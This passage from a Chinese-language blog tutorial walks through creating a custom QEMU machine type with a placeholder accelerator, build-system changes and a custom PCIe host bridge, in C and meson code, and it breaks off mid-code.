class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qom/object.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/sysemu.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    Notifier machine_done;<br>&#125; A3PCMachineState;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineClass parent;<br>&#125; A3PCMachineClass;<br></code></pre></td></tr></table></figure><p>这里对于继承自 MachineState 的子类我们添加了一个新的 <code>Notifier</code> 类型的成员，可以用来在后面构建事件通知链</p><p>我们还需要定义一些相应的父子类间转型的宏，以及一个表示新增的 <code>a3-pc</code> 类型的宏：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3PC_MACHINE MACHINE_TYPE_NAME(<span class="hljs-string">&quot;a3-pc&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCMachineState, (obj), TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCMachineClass, obj, TYPE_A3PC_MACHINE)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3PC_MACHINE_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCMachineClass, klass, TYPE_A3PC_MACHINE)</span><br></code></pre></td></tr></table></figure><p>接下来我们定义 MachineState 与 MachineClass 的初始化函数，这里只是一个最最简单的空模板，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init_done</span><span class="hljs-params">(Notifier *notifier, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br><br>    ms-&gt;machine_done.notify = a3_pc_machine_init_done;<br>    qemu_add_machine_init_done_notifier(&amp;ms-&gt;machine_done);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    MachineClass *mc = MACHINE_CLASS(oc);<br><br>    mc-&gt;init = a3_pc_machine_init;<br>    <span class="hljs-comment">// 这里设置了一个参数，指定了使用我们自己的 accelerator</span><br>    mc-&gt;default_machine_opts = <span class="hljs-string">&quot;accel=a3acl&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来我们需要声明一个 <code>TypeInfo</code> 类型的变量，用来表示我们新建的这一种机器类型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_machine_info = &#123;<br>    .name = TYPE_A3PC_MACHINE,<br>    .parent = TYPE_MACHINE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineState),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3PCMachineClass),<br>    .class_init = a3_pc_machine_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;;<br></code></pre></td></tr></table></figure><p>最后就是注册我们的新机器类型了，这里使用 <code>type_init()</code> 来完成，原理是 gcc constructor attribute 使其会调用 <code>a3_pc_machine_register()</code> 来注册 <code>a3_pc_machine_info</code> ：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_machine_info);<br>&#125;<br>type_init(a3_pc_machine_register);<br></code></pre></td></tr></table></figure><h3 id="II、accel-c：accelerator-定义"><a href="#II、accel-c：accelerator-定义" class="headerlink" title="II、accel.c：accelerator 定义"></a>II、accel.c：accelerator 定义</h3><p>接下来就是定义我们自己的 accelerator，因为 Qemu 默认需要一个 accelerator，但如果再去和原有的 accelerator 做适配就太麻烦了（<del>因为👴是懒🐕</del>），所以这里我们自己定义一个空的 accelerator，不过这一部分我们只需要声明一个新的 <code>TypeInfo</code> 类型变量即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/module.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/boards.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-core.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel.h&quot;</span></span><br><br><span class="hljs-type">bool</span> a3_pc_allowed;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_init</span><span class="hljs-params">(MachineState *ms)</span><br>&#123;<br>    MachineClass *mc = MACHINE_GET_CLASS(ms);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * opt out of system RAM being allocated by generic code</span><br><span class="hljs-comment">     */</span><br>    mc-&gt;default_ram_id = <span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_accel_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelClass *ac = ACCEL_CLASS(oc);<br>    <span class="hljs-type">static</span> GlobalProperty compat[] = &#123;<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;store-global-state&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-configuration&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>        &#123; <span class="hljs-string">&quot;migration&quot;</span>, <span class="hljs-string">&quot;send-section-footer&quot;</span>, <span class="hljs-string">&quot;off&quot;</span> &#125;,<br>    &#125;;<br><br>    ac-&gt;name = <span class="hljs-string">&quot;A3ACL&quot;</span>;<br>    ac-&gt;init_machine = a3_pc_init;<br>    ac-&gt;allowed = &amp;a3_pc_allowed;<br>    ac-&gt;compat_props = g_ptr_array_new();<br><br>    compat_props_add(ac-&gt;compat_props, compat, G_N_ELEMENTS(compat));<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_ACCEL ACCEL_CLASS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_accel_type = &#123;<br>    .name = TYPE_A3_ACCEL,<br>    .parent = TYPE_ACCEL,<br>    .class_init = a3_pc_accel_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_type_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3_pc_accel_type);<br>&#125;<br><br>type_init(a3_pc_type_init);<br></code></pre></td></tr></table></figure><h4 id="新版本-accelerator-额外添加-ops"><a href="#新版本-accelerator-额外添加-ops" class="headerlink" title="*新版本 accelerator 额外添加 ops"></a>*新版本 accelerator 额外添加 ops</h4><p>需要注意的是 qemu 的 7.0 和 5.0 的版本之间代码架构有一定的改动，所以对于 7.0 版本我们还需要额外定义一个 AccelClassOps：</p><blockquote><p> 当然，也可以直接用原有的 accelerator ，比如说 <code>tcg</code>，直接在 machine.c 代码中指定 <code>accel=tcg</code> 即可</p></blockquote><blockquote><p>添加文件：accel&#x2F;a3acl&#x2F;a3acl-accel-ops.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * QEMU A3ACL vCPU common functionality</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Copyright (c) 22 arttnba3</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * Just modify it like what you want : )</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;sysemu/accel-ops.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_handle_interrupt</span><span class="hljs-params">(CPUState *cpu, <span class="hljs-type">int</span> mask)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_kick_vcpu_thread</span><span class="hljs-params">(CPUState *unused)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_start_vcpu_thread</span><span class="hljs-params">(CPUState *cpu)</span><br>&#123;<br>    <span class="hljs-comment">// do nothing</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_init</span><span class="hljs-params">(AccelOpsClass *ops)</span><br>&#123;<br>    <span class="hljs-comment">// 这几个函数可以按照个人需要来进行改造，笔者这里仅作占位符</span><br>    ops-&gt;create_vcpu_thread = a3acl_start_vcpu_thread;<br>    ops-&gt;kick_vcpu_thread = a3acl_kick_vcpu_thread;<br>    ops-&gt;handle_interrupt = a3acl_handle_interrupt;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    AccelOpsClass *ops = ACCEL_OPS_CLASS(oc);<br><br>    ops-&gt;ops_init = a3acl_accel_ops_init;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3acl_accel_ops_type = &#123;<br>    .name = ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>),<br>    .parent = TYPE_ACCEL_OPS,<br>    .class_init = a3acl_accel_ops_class_init,<br>    .abstract = <span class="hljs-literal">true</span>,<br>&#125;;<br>module_obj(ACCEL_OPS_NAME(<span class="hljs-string">&quot;a3acl&quot;</span>));<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3acl_accel_ops_register_types</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register_static(&amp;a3acl_accel_ops_type);<br>&#125;<br>type_init(a3acl_accel_ops_register_types);<br><br></code></pre></td></tr></table></figure><blockquote><p>添加文件：accel&#x2F;a3acl&#x2F;meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs meson">a3acl_ss = ss.source_set()<br>a3acl_ss.add(files(<br>  &#x27;a3acl-accel-ops.c&#x27;,<br>))<br><br>specific_ss.add_all(when: &#x27;CONFIG_A3ACL&#x27;, if_true: a3acl_ss)<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：accel&#x2F;meson.build</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs meson">if have_system<br>  subdir(&#x27;hvf&#x27;)<br>  subdir(&#x27;qtest&#x27;)<br>  subdir(&#x27;kvm&#x27;)<br>  subdir(&#x27;xen&#x27;)<br>  subdir(&#x27;stubs&#x27;)<br>  subdir(&#x27;a3acl&#x27;) # 加上这句<br>endif<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：accel&#x2F;Kconfig</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs kconfig"># 添加上这：<br>config A3ACL<br>    bool<br>    default y<br></code></pre></td></tr></table></figure><h2 id="三、添加设备结构🕊"><a href="#三、添加设备结构🕊" class="headerlink" title="三、添加设备结构🕊"></a>三、添加设备结构🕊</h2><p>现在我们已经有了一台可以运行的空白的机器——但包括 CPU 在内的所有设备目前暂且都是不存在的，因此我们需要手动地构造机器的设备结构</p><h3 id="I、添加新的-PCIe-Host-Bridge"><a href="#I、添加新的-PCIe-Host-Bridge" class="headerlink" title="I、添加新的 PCIe Host Bridge"></a>I、添加新的 PCIe Host Bridge</h3><p>一个空的机器什么都没有，那自然是什么都干不了的，所以我们首先需要为这个机器添加上一个 <code>PCIe Host Bridge</code>，从而让我们的机器可以添加新的 PCIe 设备</p><p>惯例地就是定义一个新的 <code>PCIe Host Bridge</code> 类型的新 PCIe 设备：</p><blockquote><p>添加文件：include&#x2F;hw&#x2F;pci-host&#x2F;a3pc.h</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> HW_A3_PC_PCIE_HOST_H</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HW_A3_PC_PCIE_HOST_H</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCPCIEHost</span> &#123;</span><br>    PCIExpressHost parent_obj;<br><br>    MemoryRegion mem;<br>    MemoryRegion io;<br>&#125; A3PCPCIEHost;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3_PC_PCIE_HOST <span class="hljs-string">&quot;a3-pc-pcie-host&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3_PC_PCIE_HOST(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCPCIEHost, (obj), TYPE_A3_PC_PCIE_HOST)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* HW_A3_PC_PCIE_HOST_H */</span></span><br></code></pre></td></tr></table></figure><blockquote><p>添加文件：hw&#x2F;pci-host&#x2F;a3pc.c</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/osdep.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu-common.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;exec/memory.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/qdev-properties.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pci.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci/pcie_host.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;hw/pci-host/a3pc.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;qemu/error-report.h&quot;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_host_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// nothing to do</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_set_irq</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, <span class="hljs-type">int</span> irq_num, <span class="hljs-type">int</span> level)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (irq %d, level %d)&quot;</span>,<br>                irq_num, level);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">a3_pc_pcie_swizzle_map_irq_fn</span><span class="hljs-params">(PCIDevice *pci_dev, <span class="hljs-type">int</span> pin)</span><br>&#123;<br>    warn_report(<span class="hljs-string">&quot;A3-PC: not support INTx (pin %d)&quot;</span>, pin);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_realize</span><span class="hljs-params">(DeviceState *dev, Error **errp)</span><br>&#123;<br>    PCIHostState *pci = PCI_HOST_BRIDGE(dev);<br>    A3PCPCIEHost *h = A3_PC_PCIE_HOST(dev);<br>    SysBusDevice *sbd = SYS_BUS_DEVICE(dev);<br><br>    memory_region_init(&amp;h-&gt;mem, OBJECT(h), <span class="hljs-string">&quot;a3-pc-mem&quot;</span>, <span class="hljs-number">16</span>);<br>    memory_region_init(&amp;h-&gt;io, OBJECT(h), <span class="hljs-string">&quot;a3-pc-io&quot;</span>, <span class="hljs-number">16</span>);<br>    sysbus_init_mmio(sbd, &amp;h-&gt;mem);<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * A PCIe host in QEMU is required to provide</span><br><span class="hljs-comment">     * a pair of callbacks: set_irq() and map_irq()</span><br><span class="hljs-comment">     */</span><br>    pci-&gt;bus = pci_register_root_bus(dev, <span class="hljs-string">&quot;a3-pcie0&quot;</span>,<br>                                    a3_pc_pcie_set_irq,<br>                                    a3_pc_pcie_swizzle_map_irq_fn,<br>                                    h, &amp;h-&gt;mem, &amp;h-&gt;io, <br>                                    <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TYPE_PCIE_BUS);<br>&#125;<br><br><span class="hljs-type">static</span> Property a3_pc_pcie_host_props[] = &#123;<br>    DEFINE_PROP_END_OF_LIST(),<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    DeviceClass *dc = DEVICE_CLASS(oc);<br><br>    dc-&gt;realize = a3_pc_pcie_host_realize;<br>    set_bit(DEVICE_CATEGORY_BRIDGE, dc-&gt;categories);<br>    device_class_set_props(dc, a3_pc_pcie_host_props);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_pc_pcie_host = &#123;<br>    .name = TYPE_A3_PC_PCIE_HOST,<br>    .parent = TYPE_PCI_HOST_BRIDGE,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3PCPCIEHost),<br>    .instance_init = a3_pc_host_init,<br>    .class_init = a3_pc_class_init,<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_pcie_host_register</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    type_register(&amp;a3_pc_pcie_host);<br>&#125;<br><br>type_init(a3_pc_pcie_host_register);<br></code></pre></td></tr></table></figure><blockquote><p>修改文件：hw&#x2F;pci-host&#x2F;meson.build</p><blockquote><p>老版本没测了，自己想该怎么改吧（笑）</p></blockquote></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs meson"># A3 devices<br>pci_ss.add(when: &#x27;CONFIG_PCI&#x27;, if_true: files(&#x27;a3pc.c&#x27;))<br></code></pre></td></tr></table></figure><p>之后我们在我们的机器类型中加上 PCI 相关的两个指针成员：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCMachineState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    MachineState parent;<br><br>    <span class="hljs-comment">/* &lt;public&gt; */</span><br><br>    <span class="hljs-comment">/* State for other subsystems/APIs: */</span><br>    Notifier machine_done;<br><br>    <span class="hljs-comment">/* Pointers to devices and objects: */</span><br>    PCIBus *bus;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * QEMU requires the entire PCI(e) hierarchy be attached to</span><br><span class="hljs-comment">     * a PCI(e) bus, so BES-VNC machine has to implement one.</span><br><span class="hljs-comment">     */</span><br>    PCIHostState *pci;<br>&#125; A3PCMachineState;<br></code></pre></td></tr></table></figure><p>最后在机器初始化函数中初始化一个我们自定义的这个 PCIe 设备即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_pc_machine_init</span><span class="hljs-params">(MachineState *machine)</span><br>&#123;<br>    A3PCMachineState *ms = A3PC_MACHINE(machine);<br>    DeviceState *dev = qdev_new(TYPE_A3_PC_PCIE_HOST);<br><br>    sysbus_realize_and_unref(SYS_BUS_DEVICE(dev), &amp;error_fatal);<br>    ms-&gt;pci = PCI_HOST_BRIDGE(dev);<br><br>    memory_region_add_subregion(get_system_memory(), <span 